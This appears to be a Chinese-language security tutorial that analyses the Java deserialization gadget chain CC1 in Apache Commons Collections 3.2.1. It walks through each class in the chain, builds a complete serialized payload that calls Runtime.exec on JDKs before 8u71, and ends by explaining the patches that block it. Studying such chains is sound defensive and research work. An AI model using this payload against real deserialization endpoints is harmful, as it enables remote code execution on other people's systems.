## Commons Collections简介

Commons
Collections是一个由Apache软件基金会开发的Java集合库，提供了一组可重用的数据结构和算法实现，帮助Java开发人员提高开发效率和代码质量。它包含了许多实用的集合类（map,list,set）、迭代器和比较器等组件，支持泛型，与Java集合框架兼容。

它的包结构如下：

  * `org.apache.commons.collections`– CommonsCollections自定义的一组公用的接口和工具类

  * `org.apache.commons.collections.bag`– 实现Bag接口的一组类

  * `org.apache.commons.collections.bidimap`– 实现BidiMap系列接口的一组类

  * `org.apache.commons.collections.buffer`– 实现Buffer接口的一组类

  * `org.apache.commons.collections.collection`–实现java.util.Collection接口的一组类

  * `org.apache.commons.collections.comparators`– 实现java.util.Comparator接口的一组类

  * `org.apache.commons.collections.functors`–Commons Collections自定义的一组功能类

  * `org.apache.commons.collections.iterators`– 实现java.util.Iterator接口的一组类

  * `org.apache.commons.collections.keyvalue`– 实现集合和键/值映射相关的一组类

  * `org.apache.commons.collections.list`– 实现java.util.List接口的一组类

  * `org.apache.commons.collections.map`– 实现Map系列接口的一组类

  * `org.apache.commons.collections.set`– 实现Set系列接口的一组类

在list，map，set包中分别对jdk中的集合类进行了扩展，如`MultiKeyMap`可以两个key对应一个值。`LazyMap`中的键/值对一开始并不存在，当被调用到时才创建。

在functors包中实现了Commons
Collections中自定义的一些工具类，主要是Transformer和Predicate的实现类，transformer接口是一个转换器，每个实现类都要实现transform(Object
input)方法来自定义转换器。如StringValueTransformer.trasform(Object input)将对象转换为字符串。

Predicate接口是一个函数式接口，用于表示一种可应用于对象的测试条件，可以用于过滤集合、筛选数据等操作中，提高代码的可读性和可维护性。

## CC1分析

 **环境准备**

  * jdk < 8u71

  * Commons Collections <= 3.2.1

### 危险方法

我们还是按照反序列化的条件来分析，首先找一个危险方法。这种通常存在于一些功能性的类里面，所以首先从transform接口开始，看一下它的所有实现类。

![image](https://image.3001.net/images/20230418/1681826859_643ea42be7216367df8f3.png)

####  **InvokerTransformer**

最后发现在InvokerTransformer.transform(Object
input)中如果参数可控可以执行任意类的方法。看一下它的构造方法和transform

    
    
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
    
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
    
        } ....
    }
    

我们在构造方法中传入要执行方法的方法名，参数类型以及参数值，在调用transform方法时传入对应的实例就可以实现方法执行。其构造方法如下。

    
    
    InvokerTransformer invokerTransformer = new InvokerTransformer("exec",
                    new Class[]{String.class},new Object[]{"calc"});
    invokerTransformer.transform(Runtime.getRuntime());
    

![image](https://image.3001.net/images/20230418/1681826938_643ea47a3be0c4c8ba7a9.png)

### 调用链

上面找到了入口点，现在就需要进行回溯找调用链，idea提供了一个很方便的方法，我们可以在InvokerTransformer的transform方法名上右键选择Find
Usage就可以找到所有可以调用该方法的地方

![image](https://image.3001.net/images/20230418/1681827036_643ea4dc8eec193af8f09.png)

我们再一个一个去看每个调用的地方可不可以被利用。我们最后的整个调用链肯定是从一个类的A方法到另一个类的B方法这样才能将链进行延伸，如果始终是同一个接口实现类下的同名方法调用那都在一个圈子里绕，没有出去。在代理对象中执行一个方法会自动转给代理方法执行，这也实现了方法的跨越。

####  **TransformedMap**

最后我们找到了TransformedMap类，它的checkSetValue方法调用了transform方法。

先简单介绍一下TransformedMap，它对map进行了扩展，类继承图如下

![image](https://image.3001.net/images/20230418/1681827214_643ea58e86de415bc530c.png)

TransformedMap的构造方法如下

    
    
    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        super(map);
        this.keyTransformer = keyTransformer;
        this.valueTransformer = valueTransformer;
    }
    

需要传入一个map和一个keyTransformer，valueTransformer。同时该构造方法是protected，外部只能通过decorate或者decorateTransform来实例化对象。另外该类还只有两个public方法用于添加对象。

    
    
    public Object put(Object key, Object value) {
        key = transformKey(key);
        value = transformValue(value);
        return getMap().put(key, value);
    }
    
    public void putAll(Map mapToCopy) {
        mapToCopy = transformMap(mapToCopy);
        getMap().putAll(mapToCopy);
    }
    

可以看到每次添加对象前都调用了transform转换器后再put到map属性中，另外父类中还有一个public方法。

    
    
    public Set entrySet() {
        if (isSetValueChecking()) {
            return new EntrySet(map.entrySet(), this);
        } else {
            return map.entrySet();
        }
    }
    

用于获取entryset，它返回的是一个entry集合，在map中每一个键值对构成一个entry。

在父类AbstractInputCheckedMapDecorator中重新实现了EntrySet，EntrySetIterator，MapEntry类。

现在大概了解了TransformedMap有哪些方法和对外的接口，我们之前找到在checkSetValue中调用了transform方法，但它是protected，所以要继续回溯，找到了在父类中的MapEntry中setValue方法调用了parent.checkSetValue()，而MapEntry需要在EntrySet遍历时获取。

    
    
    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
    
    public Object setValue(Object value) {
        value = parent.checkSetValue(value);
        return entry.setValue(value);
    }
    

如下示例：

    
    
    InvokerTransformer invokerTransformer = new InvokerTransformer("exec",
            new Class[]{String.class},new Object[]{"calc"});
    
    Map<Object,Object> map = new HashMap<>();
    map.put("aaa","bbb");
    Map<Object,Object> transformedMap = (TransformedMap) TransformedMap.decorate(map,null,invokerTransformer);
    
    for (Map.Entry entry :
         transformedMap.entrySet()) {
        entry.setValue(Runtime.getRuntime());
    }
    

### 入口点

综合上面的内容我们现在找到的利用链如下：

    
    
    AbstractInputCheckedMapDecorator.MapEntry.setValue(Runtime.getRuntime())
        TransformedMap.checkSetValue(Runtime.getRuntime())
        	InvokerTransformer.transform(Runtime.getRuntime())
        		Runtime.getRuntime().exec("calc")
    

我们现在如果能找到一个类的readObject中对一个map进行了循环取值，同时调用了entry.setValue就将真个链连起来了。

####  **AnnotationInvocationHandler**

最后找到了AnnotationInvocationHandler类，它的readObject方法如下：

    
    
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
    ...
        AnnotationType annotationType = null;
    ...
        annotationType = AnnotationType.getInstance(type);
    ...
        Map<String, Class<?>> memberTypes = annotationType.memberTypes();
    
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
    

可以看到这个方法中遍历了memberValues的entrySet，然后调用了setValue方法。在调用之前还有一些条件判断。需要在type注解属性存在和memberValues中的key同名的成员名。

如type是Target.class，则需要map.put("value","xxx");

![image](https://image.3001.net/images/20230418/1681827361_643ea621619fb2e379b70.png)

### 如何构造反序列化

前面我们基本上找到了整体的反序列化调用链，从入口点的readObject方法到最后的任意方法调用方法。但会发发现在AnnotationInvocationHandler类中调用setValue时，它的参数不可控，所以我们还需要继续找其他方法绕过这个参数限制，如果有一个类的方法在传入任何参数最后都返回一样的结果就好了。

####  **ConstantTransformer**

最后我们找到了ConstantTransformer类，它的transform方法可以返回一个固定的属性值。

    
    
    public Object transform(Object input) {
        return iConstant;
    }
    

这个类看似可以帮我们解决参数的限制，但它也阻断了原来InvokerTransformer的调用，我们还需要找一个方法能将多个transform连起来，同时能将ConstantTransformer.transform()的返回值传递给InvokerTransformer.transform()方法。

####  **ChainedTransformer**

这个类就是ChainedTransformer，它可以传递一个transform数组，在它的transform方法中会调用数组中的每一个transform方法，同时上一个的结果将作为下一个的参数。

    
    
    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
    

#### **最后的问题**

在构造利用链时我们出了注意各个链的连接点，参数传递，还需要注意每个对象及其属性值是否可以被序列化。在Java原生反序列化中每个序列化的类必须要实现Serializable接口。我们在前面传递的Runtime对象，它没有实现反序列化接口，所以它在反序列化时会报错，我们需要使用其他的可序列的类来获取它的实例。我们前面知道了InvokerTransformer.transform可以执行任意方法，我们可以使用它借助发射帮我们获取Runtime的实例。

    
    
    Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),//获取getRuntime方法对应的反射对象(Method实例)
        new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),//调用getRuntime反射对象的invoke方法获取到Runtime实例
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),//执行Runtime的exec方法
    };
    
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    chainedTransformer.transform("xxxx");
    

这一步可能有点绕，我第一次就看了好久。首先我们先把InvokerTransformer.transform(input)简化一下

    
    
    input.getClass().getMethod(iMethodName, iParamTypes).invoke(input, iArgs);
    

当我们传入Runtime.class时，它调用getMethod方法的对象是Runtime.class.getClass(),是Class的类对象，不是Runtime.class，所以当直接反射调用getRuntime时会报错显示无法找到这样的方法。我只能通过Class.class获取到getMethod方法的反射对象，然后再利用它获取Runtime.class的getRuntime方法的反射对象。最后再调用这个反射对象的invoke方法获取到Runtime对象。

### payload

根据上面每一步的分析最后可以写出payload如下

    
    
    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),//获取getRuntime方法对应的反射对象(Method实例)
            new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class},new Object[]{null,null}),//调用getRuntime反射对象的invoke方法获取到Runtime实例
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),//执行Runtime的exec方法
    };
    
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
    
    Map<Object,Object> map = new HashMap<>();
    map.put("value","xxxx");
    TransformedMap transformedMap = (TransformedMap) TransformedMap.decorate(map,null,chainedTransformer);
    
    Class aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor annotationInvocationHandlerConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
    annotationInvocationHandlerConstructor.setAccessible(true);
    Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);
    
    Serialize(o);
    

## 总结

现在回过头来看这条链和URLDNS比起来还是比较复杂的，里面涉及了很多java相关的知识点。在ysoserial中利用了LazyMap类，这个在后面分析另外几个cc链时再说。在这个链中既依赖了CC依赖，同时还利用了jdk源码中的AnnotationInvocationHandler类，在jdk8u71后修改了它的readObject方法，不再调用setValue就阻断了这条链。同时在CC版本3.2.22中的InvokerTransformer自定义了readObject和writeObject方法，在序列化时会进行检查，禁止了不安全的反序列化操作。

## 参考资料

[Apache Commons
Collections包和简介](https://cloud.tencent.com/developer/article/2048228)

[Java反序列化之CC1其一](https://chenlvtang.top/2021/05/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1%E5%85%B6%E4%B8%80/)

[java反序列化-cc1链分析](https://www.freebuf.com/articles/web/359829.html)

